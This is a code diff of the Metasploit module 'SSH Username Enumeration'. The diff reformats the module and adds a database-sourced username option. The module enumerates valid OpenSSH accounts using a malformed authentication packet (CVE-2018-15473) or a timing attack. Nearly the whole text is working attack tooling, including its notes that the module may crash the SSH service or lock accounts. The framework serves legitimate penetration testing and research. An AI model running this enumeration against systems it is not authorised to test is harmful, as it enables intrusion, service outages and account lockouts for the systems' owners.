@@ -9,51 +9,70 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'SSH Username Enumeration',
-      'Description'    => %q{
-        This module uses a malformed packet or timing attack to enumerate users on
-        an OpenSSH server.
+    super(
+      update_info(
+        info,
+        'Name' => 'SSH Username Enumeration',
+        'Description' => %q{
+          This module uses a malformed packet or timing attack to enumerate users on
+          an OpenSSH server.
 
-        The default action sends a malformed (corrupted) SSH_MSG_USERAUTH_REQUEST
-        packet using public key authentication (must be enabled) to enumerate users.
+          The default action sends a malformed (corrupted) SSH_MSG_USERAUTH_REQUEST
+          packet using public key authentication (must be enabled) to enumerate users.
 
-        On some versions of OpenSSH under some configurations, OpenSSH will return a
-        "permission denied" error for an invalid user faster than for a valid user,
-        creating an opportunity for a timing attack to enumerate users.
+          On some versions of OpenSSH under some configurations, OpenSSH will return a
+          "permission denied" error for an invalid user faster than for a valid user,
+          creating an opportunity for a timing attack to enumerate users.
 
-        Testing note: invalid users were logged, while valid users were not. YMMV.
-      },
-      'Author'         => [
-        'kenkeiras',     # Timing attack
-        'Dariusz Tytko', # Malformed packet
-        'Michal Sajdak', # Malformed packet
-        'Qualys',        # Malformed packet
-        'wvu'            # Malformed packet
-      ],
-      'References'     => [
-        ['CVE', '2003-0190'],
-        ['CVE', '2006-5229'],
-        ['CVE', '2016-6210'],
-        ['CVE', '2018-15473'],
-        ['OSVDB', '32721'],
-        ['BID', '20418'],
-        ['URL', 'https://seclists.org/oss-sec/2018/q3/124'],
-        ['URL', 'https://sekurak.pl/openssh-users-enumeration-cve-2018-15473/']
-      ],
-      'License'        => MSF_LICENSE,
-      'Actions'        => [
-        ['Malformed Packet',
-         'Description' => 'Use a malformed packet',
-         'Type'        => :malformed_packet
+          Testing note: invalid users were logged, while valid users were not. YMMV.
+        },
+        'Author' => [
+          'kenkeiras',     # Timing attack
+          'Dariusz Tytko', # Malformed packet
+          'Michal Sajdak', # Malformed packet
+          'Qualys',        # Malformed packet
+          'wvu'            # Malformed packet
         ],
-        ['Timing Attack',
-         'Description' => 'Use a timing attack',
-         'Type'        => :timing_attack
-        ]
-      ],
-      'DefaultAction'  => 'Malformed Packet'
-    ))
+        'References' => [
+          ['CVE', '2003-0190'],
+          ['CVE', '2006-5229'],
+          ['CVE', '2016-6210'],
+          ['CVE', '2018-15473'],
+          ['OSVDB', '32721'],
+          ['BID', '20418'],
+          ['URL', 'https://seclists.org/oss-sec/2018/q3/124'],
+          ['URL', 'https://sekurak.pl/openssh-users-enumeration-cve-2018-15473/']
+        ],
+        'License' => MSF_LICENSE,
+        'Actions' => [
+          [
+            'Malformed Packet',
+            {
+              'Description' => 'Use a malformed packet',
+              'Type' => :malformed_packet
+            }
+          ],
+          [
+            'Timing Attack',
+            {
+              'Description' => 'Use a timing attack',
+              'Type' => :timing_attack
+            }
+          ]
+        ],
+        'DefaultAction' => 'Malformed Packet',
+        'Notes' => {
+          'Stability' => [],
+          'Reliability' => [
+            CRASH_SERVICE_DOWN # possible that a malformed packet may crash the service
+          ],
+          'SideEffects' => [
+            IOC_IN_LOGS,
+            ACCOUNT_LOCKOUTS, # timing attack submits a password
+          ]
+        }
+      )
+    )
 
     register_options(
       [
@@ -63,10 +82,14 @@ class MetasploitModule < Msf::Auxiliary
                       [false, 'Single username to test (username spray)']),
         OptPath.new('USER_FILE',
                     [false, 'File containing usernames, one per line']),
+        OptBool.new('DB_ALL_USERS',
+                    [false, 'Add all users in the current database to the list', false]),
         OptInt.new('THRESHOLD',
-                   [true,
-                   'Amount of seconds needed before a user is considered ' \
-                   'found (timing attack only)', 10]),
+                   [
+                     true,
+                     'Amount of seconds needed before a user is considered ' \
+                     'found (timing attack only)', 10
+                   ]),
         OptBool.new('CHECK_FALSE',
                     [false, 'Check for false positives (random username)', false])
       ]
@@ -75,14 +98,20 @@ class MetasploitModule < Msf::Auxiliary
     register_advanced_options(
       [
         OptInt.new('RETRY_NUM',
-                   [true , 'The number of attempts to connect to a SSH server' \
-                   ' for each user', 3]),
+                   [
+                     true, 'The number of attempts to connect to a SSH server' \
+                   ' for each user', 3
+                   ]),
         OptInt.new('SSH_TIMEOUT',
-                   [false, 'Specify the maximum time to negotiate a SSH session',
-                   10]),
+                   [
+                     false, 'Specify the maximum time to negotiate a SSH session',
+                     10
+                   ]),
         OptBool.new('SSH_DEBUG',
-                    [false, 'Enable SSH debugging output (Extreme verbosity!)',
-                    false])
+                    [
+                      false, 'Enable SSH debugging output (Extreme verbosity!)',
+                      false
+                    ])
       ]
     )
   end
@@ -108,28 +137,23 @@ class MetasploitModule < Msf::Auxiliary
   def check_user(ip, user, port)
     technique = action['Type']
 
-    opts = {
-      :port            => port,
-      :use_agent       => false,
-      :config          => false,
-      :proxy           => ssh_socket_factory,
-      :non_interactive => true,
-      :verify_host_key => :never
-    }
+    opts = ssh_client_defaults.merge({
+      port: port
+    })
 
     # The auth method is converted into a class name for instantiation,
     # so malformed-packet here becomes MalformedPacket from the mixin
     case technique
     when :malformed_packet
-      opts.merge!(:auth_methods => ['malformed-packet'])
+      opts.merge!(auth_methods: ['malformed-packet'])
     when :timing_attack
       opts.merge!(
-        :auth_methods => ['password', 'keyboard-interactive'],
-        :password     => rand_pass
+        auth_methods: ['password', 'keyboard-interactive'],
+        password: rand_pass
       )
     end
 
-    opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
+    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
     start_time = Time.new
 
@@ -163,7 +187,7 @@ class MetasploitModule < Msf::Auxiliary
     Rex::Text.rand_text_english(64_000..65_000)
   end
 
-  def do_report(ip, user, port)
+  def do_report(ip, user, _port)
     service_data = {
       address: ip,
       port: rport,
@@ -175,12 +199,12 @@ class MetasploitModule < Msf::Auxiliary
     credential_data = {
       origin_type: :service,
       module_fullname: fullname,
-      username: user,
+      username: user
     }.merge(service_data)
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_data)
 
     create_credential_login(login_data)
@@ -188,29 +212,40 @@ class MetasploitModule < Msf::Auxiliary
 
   # Because this isn't using the AuthBrute mixin, we don't have the
   # usual peer method
-  def peer(rhost=nil)
+  def peer(rhost = nil)
     "#{rhost}:#{rport} - SSH -"
   end
 
   def user_list
     users = []
 
-    if datastore['USERNAME']
-      users << datastore['USERNAME']
-    elsif datastore['USER_FILE'] && File.readable?(datastore['USER_FILE'])
+    users << datastore['USERNAME'] unless datastore['USERNAME'].blank?
+
+    if datastore['USER_FILE']
+      fail_with(Failure::BadConfig, 'The USER_FILE is not readable') unless File.readable?(datastore['USER_FILE'])
       users += File.read(datastore['USER_FILE']).split
     end
 
-    users
+    if datastore['DB_ALL_USERS']
+      if framework.db.active
+        framework.db.creds(workspace: myworkspace.name).each do |o|
+          users << o.public.username if o.public
+        end
+      else
+        print_warning('No active DB -- The following option will be ignored: DB_ALL_USERS')
+      end
+    end
+
+    users.uniq
   end
 
   def attempt_user(user, ip)
     attempt_num = 0
     ret = nil
 
-    while attempt_num <= retry_num and (ret.nil? or ret == :connection_error)
+    while (attempt_num <= retry_num) && (ret.nil? || (ret == :connection_error))
       if attempt_num > 0
-        Rex.sleep(2 ** attempt_num)
+        Rex.sleep(2**attempt_num)
         vprint_status("#{peer(ip)} Retrying '#{user}' due to connection error")
       end
 
@@ -233,6 +268,14 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
+  def run
+    if user_list.empty?
+      fail_with(Failure::BadConfig, 'Please populate DB_ALL_USERS, USER_FILE, USERNAME')
+    end
+
+    super
+  end
+
   def run_host(ip)
     print_status("#{peer(ip)} Using #{action.name.downcase} technique")
 
@@ -245,11 +288,6 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     users = user_list
-
-    if users.empty?
-      print_error('Please populate USERNAME or USER_FILE')
-      return
-    end
 
     print_status("#{peer(ip)} Starting scan")
     users.each { |user| show_result(attempt_user(user, ip), user, ip) }
